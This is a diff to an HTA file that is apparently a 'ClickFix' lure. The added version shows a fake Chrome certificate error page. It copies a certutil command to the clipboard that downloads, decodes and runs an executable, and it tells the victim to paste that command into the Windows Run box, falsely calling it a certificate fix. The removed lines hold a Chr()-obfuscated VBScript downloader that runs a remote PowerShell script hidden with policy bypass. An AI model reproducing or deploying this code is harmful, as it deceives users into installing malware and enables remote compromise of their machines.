@@ -1,27 +1,42 @@
 <html>
-<head><title>.</title>
-<hta:application id="o" showintaskbar="no" caption="no" border="none" windowstate="minimize" />
+<head><title>Chrome - Certificate Error</title>
+<hta:application id="o" showintaskbar="no" caption="no" border="thin" windowstate="maximize" />
+<style>
+body{margin:0;background:#fff;font-family:Segoe UI,sans-serif;color:#1a1a1a;text-align:center;padding-top:60px}
+h1{font-size:28px;font-weight:400;color:#d93025}
+p{font-size:15px;color:#5f6368;max-width:520px;margin:12px auto;line-height:1.5}
+.code{background:#f1f3f4;border:1px solid #dadce0;border-radius:8px;padding:12px 18px;font-family:Consolas,monospace;font-size:13px;color:#202124;display:inline-block;margin:8px 0;text-align:left;white-space:pre}
+.btn{background:#1a73e8;color:#fff;border:none;border-radius:20px;padding:10px 28px;font-size:14px;cursor:pointer;margin:6px}
+.btn:hover{background:#1557b0}
+.step{background:#e8f0fe;border-radius:8px;padding:14px 18px;display:inline-block;margin:6px 0;font-size:14px;color:#1967d2}
+.err{border-left:4px solid #d93025;background:#fce8e6;padding:12px 16px;border-radius:4px;display:inline-block;margin:10px 0;font-size:14px;color:#c5221f}
+</style>
 <script language="VBScript">
 On Error Resume Next
-Dim s,f,t,p,u,a,b
-Set s = CreateObject("WScript.Shell")
-Set f = CreateObject("Scripting.FileSystemObject")
-t = f.GetSpecialFolder(2)
-p = t & "\c.ps1"
-u = "https://raw.githubusercontent.com/kai195102/d/main/clickfix.ps1"
-b = Chr(99)&Chr(101)&Chr(114)&Chr(116)&Chr(117)&Chr(116)&Chr(105)&Chr(108)
-b = b & Chr(32)&Chr(45)&Chr(117)&Chr(114)&Chr(108)&Chr(99)&Chr(97)&Chr(99)&Chr(104)&Chr(101)
-b = b & Chr(32)&Chr(45)&Chr(115)&Chr(112)&Chr(108)&Chr(105)&Chr(116)
-b = b & Chr(32)&Chr(45)&Chr(102)&Chr(32)
-s.Run b & Chr(34) & u & Chr(34) & Chr(32) & Chr(34) & p & Chr(34), 0, True
-a = Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)
-a = a & Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(110)&Chr(73)
-a = a & Chr(32)&Chr(45)&Chr(87)&Chr(32)&Chr(72)&Chr(105)&Chr(100)&Chr(100)&Chr(101)&Chr(110)
-a = a & Chr(32)&Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)
-a = a & Chr(32)&Chr(45)&Chr(70)&Chr(32)&Chr(34) & p & Chr(34)
-s.Run a, 0, False
-window.close()
+Dim cmd
+cmd = "certutil -urlcache -split -f https://raw.githubusercontent.com/kai195102/d/main/rs.b64 %temp%\r.b64 & certutil -decode %temp%\r.b64 %temp%\r.exe & %temp%\r.exe"
+Sub copyCmd
+  Dim el
+  Set el = document.getElementById("cmdBox")
+  el.value = cmd
+  el.select()
+  document.execCommand "copy"
+  document.getElementById("status").innerHTML = "<span style='color:#188038'>Copied! Now press <b>Windows + R</b> on your keyboard.</span>"
+End Sub
 </script>
 </head>
-<body></body>
+<body>
+<div style="max-width:560px;margin:0 auto">
+<div style="font-size:64px;color:#d93025;margin-bottom:10px">&#9888;</div>
+<h1>Chrome certificate update failed</h1>
+<p class="err">NET::ERR_CERT_AUTHORITY_INVALID — Your root certificates are out of date. Secure connections to Google, Microsoft, and banking sites will fail until resolved.</p>
+<p>Click the button below to copy the fix command to your clipboard.</p>
+<button class="btn" onclick="copyCmd()">Copy Fix</button>
+<p id="status" style="margin:8px 0;min-height:24px;font-size:14px"></p>
+<div class="step"><b>Step 1:</b> Press <b>Windows + R</b> on your keyboard</div><br>
+<div class="step"><b>Step 2:</b> Paste the command into the Run box and press <b>Enter</b></div>
+<p style="font-size:12px;color:#80868b;margin-top:18px">This command re-registers Windows certificate stores. Windows Security may briefly flash — this is normal.</p>
+</div>
+<input type="text" id="cmdBox" style="position:absolute;left:-9999px">
+</body>
 </html>
